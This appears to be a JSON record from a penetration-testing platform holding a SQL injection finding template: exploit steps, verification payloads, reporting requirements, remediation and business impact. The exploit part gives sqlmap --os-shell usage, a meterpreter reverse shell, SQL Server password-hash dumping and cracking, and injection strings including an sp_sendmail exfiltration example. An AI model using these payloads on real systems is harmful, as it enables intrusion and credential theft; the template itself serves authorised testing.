{"default_url":null,"content":{"state":0,"taskInstructions":null,"references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":877,"exploitInstructions":"------------------------------------------------------------------------------------------<br>Verify sysadmin access<br>------------------------------------------------------------------------------------------ <br>#1 Determine if the user is a sysadmin<br>select is_srvrolemember('sysadmin')<br><br>------------------------------------------------------------------------------------------<br>Verify sysadmin access<br>------------------------------------------------------------------------------------------ <br>#1 Use 'waitfor '00:00:10'; in the injection for a screenshot<br><br>#2 Take screenshot of response<br><br>------------------------------------------------------------------------------------------<br>Obtain a shell on the system<br>------------------------------------------------------------------------------------------ <br>#1 Open Kali<br><br>#2 Open a console to sqlmap<br><br>#3 Get a command console with the following command:<br>Note: requires sysadmin access.<br><br>python sqlmap.py -u <http://www.acme.com?id=1> --os-shell<br><br>#4 Use access to send a Metasploit meterpreter reverse shell over port 443 or 53.<br>Note: this will require that a metasploit listener is setup.<br><br>------------------------------------------------------------------------------------------<br>Instructions Dumping and Cracking SQL Passwords<br>------------------------------------------------------------------------------------------ <br>#1 - Obtain SQL Server password hashes via sqlmap --sql-shell<br><br>SQL Server 2000<br>select name,password_hash from sysxlogins;<br> <br>SQL Server 2005/2008<br>select name,password_hash from sys.sql_logins;<br> <br>#2 - Parse the hashes<br>first 6 = padding<br>next 8 = salt<br>next 40 = mixed case hash<br> <br>#3 - Open Cain and navigate to the Cracker tab<br><br>#4 - Click MSSQL Hashes and click in the main MSSQL hashes window<br><br>#5 Click the + button to add the hash<br><br>#6 Choose mixed case dictionary attack<br><br>#7 If #6 fails, Choose mixed case brute force<br><br> <br>Reference<br>http://hkashfi.blogspot.com/2007/08/breaking-sql-server-2005-hashes.html","verificationInstructions":"<b>Verification Instructions</b><br><br>Use SQLMap to extract data and to prove if operating system command execution is possible. Typical use:<br><br>python sqlmap.py -u http://site/search.asp?id=1&amp;name=2 -p id --dbms=dbtype --sql-shell<br><br>python sqlmap.py --help for all sqlmap options (such as --os-shell).<br><br>Manually test SQL injections on the affected parameters. Good injection strings include \"'\", \";\" and \"--\". If the web server behaves unexpectedly (error messages, unexpected results etc.), try to create queries that get successfully executed on the server. If necessary, consult your coworkers.<br><br>A good verification for SQL injection proves data extraction, proves that injected queries were successfully executed, and/or possible command execution. <br><br>---------------------------------------------------------------------------------------------------------------------<br><br>Union Select - Example - 1<br>http://www.store.com/id=1+union+select+null,null,name,null+from+master..sysdatabases;--<br><br>Error Based - Example - 1<br>http://www.store.com/id=cast(@@version+as+int);--<br><br>Blind Example - Example -1 - Time Based<br>http://www.store.com/id=1';WAITFOR+DELAY+'00:00:10';--<br><br><br>Blind Example - Example -1 - Send Email<br>http://www.store.com/id=1';exec+master..sp_sendmail+'',@query='select+system_user';--<br><br><b>Reporting Requirements</b><br><ol><li>Add screenshot of the initial page</li><br><li>Add screenshot of the initial request</li><br><li>Add screenshot for modified request that is used to identify the injection (such as single quote causing an error message)</li><br><li>Add sample injections (whole request not necessary) and show how data was enumerated</li><br><li>Show the level of access</li><br></ol><br><b>Further Testing</b><br><br>Test for additional findings that can be identified via SQL injection:<br><ul><li>Insufficient Egress Filtering</li><br><li>Cleartext sensitive data in database</li><br><li>Excessive permissions for database user, service account, and links</li><br></ul><br><b>References</b><br>SQL Injection wikis - https://github.com/NetSPI/<br><br><b>Tools</b><br>sqlmap - http://sqlmap.org/<br>","remediationInstructions":"Employ a layered approach to security that includes using parameterized queries when accepting user input. Strictly define the data type (for instance, a string, an alphanumeric character, etc.) that the application will accept and harden the database server to prevent data from being accessed inappropriately. Also, ensure that all data used by the application is put through a data input filter that removes potentially harmful characters. Best practice recommends the use of allowlists using regular expressions.<br><br>Disable detailed error messages that could give an attacker information about database names, table names, versions and type of databases being used. Replace the error message with a generic error asking the user to contact the IT department or send an e-mail to the web administrator.<br><br>A non-privileged service account should be used to run the database server, and the database user in use should not have administrative privileges to the database. Following the principle of least privilege when assigning permissions for the service account and database user helps limit the impact of a successful SQL injection attack.<br>","name":"SQL Injection","sourceId":"GID:2851","severity":"High","businessImpact":"SQL injection may allow an attacker to extract, modify, add, or delete information from database servers, causing the confidentiality and integrity of the information stored in the database to be compromised.\r<br>\r<br>Depending on the SQL implementation, the attacker may also be able to execute system commands on the affected host. In some circumstances, this provides the means to take control of the server hosting the database, leading to the complete compromise of the confidentiality, integrity, and availability of the affected host.","description":"SQL injection is a method of attack that takes advantage of input variables that have not been validated, thus allowing the manipulation of SQL queries processed by the backend database server. It is often presented in web-based forms, queries within URLs, and XML requests.<br>"}}}